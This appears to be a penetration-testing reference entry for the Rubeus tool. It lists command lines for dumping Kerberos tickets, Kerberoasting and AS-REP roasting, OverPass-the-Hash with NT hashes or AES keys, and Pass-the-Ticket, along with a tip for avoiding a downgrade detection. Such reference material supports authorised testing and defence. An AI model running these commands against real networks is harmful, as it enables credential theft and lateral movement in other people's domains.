---
tool: Rubeus
slug: rubeus
kind: tool
stages: [post-compromise]
targets: [windows]
category: Kerberos abuse toolkit (Windows)
platforms: [windows]
services: [kerberos]
ports: [88]
tags: [kerberos, rubeus, kerberoast, asreproast, overpass-the-hash, pass-the-ticket, ticket]
attack: [T1558.003, T1558.004, T1550.003, T1550.002]
summary: The Kerberos Swiss army knife on Windows. Request and dump tickets, Kerberoast and AS-REP roast, turn a hash or key into a TGT (OverPass-the-Hash), and import tickets for Pass-the-Ticket. The Windows counterpart to Impacket's Kerberos tools.
references:
  - GhostPack Rubeus | https://github.com/GhostPack/Rubeus
  - The Hacker Recipes: Kerberos | https://www.thehacker.recipes/ad/movement/kerberos/
---

## When to reach for it

On a Windows foothold in a domain, when you want to work Kerberos without dropping Mimikatz: harvest tickets, OverPass-the-Hash, Pass-the-Ticket and Pass-the-Certificate. This is the tool's command reference for that workflow.

## Harvest and roast

```cmd
Rubeus.exe dump /nowrap                 :: dump all tickets as base64 (admin for all users)
Rubeus.exe kerberoast /nowrap           :: TGS-REP hashes for SPN accounts (crack -m 13100)
Rubeus.exe asreproast /nowrap           :: AS-REP hashes for no-preauth users (crack -m 18200)
Rubeus.exe triage                       :: list the tickets in the current session
```

## Request a ticket (OverPass-the-Hash / Pass-the-Key)

Turn a hash or AES key into a TGT; `/ptt` imports it straight into the session.

```cmd
Rubeus.exe asktgt /user:julio /rc4:NTHASH /nowrap
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:AESKEY /ptt
```

Prefer `/aes256` over `/rc4`: modern domains default to AES, and an RC4 exchange can flag as an encryption downgrade.

## Pass the Ticket

```cmd
Rubeus.exe ptt /ticket:ticket.kirbi            :: import a .kirbi from disk
Rubeus.exe ptt /ticket:doIE1jCCBN...           :: or a base64 blob
Rubeus.exe createnetonly /program:cmd.exe /show :: sacrificial logon, keeps your own TGTs
```

## Notes

Requesting, roasting and importing tickets is normal Kerberos traffic but still logged (4768/4769 on the DC), and roasting is a classic detection. Run it only in scope, crack the hashes offline on your own machine, and treat tickets and keys as sensitive engagement data. Rubeus does not need local admin for most actions (unlike Mimikatz), which is part of why it is reached for.
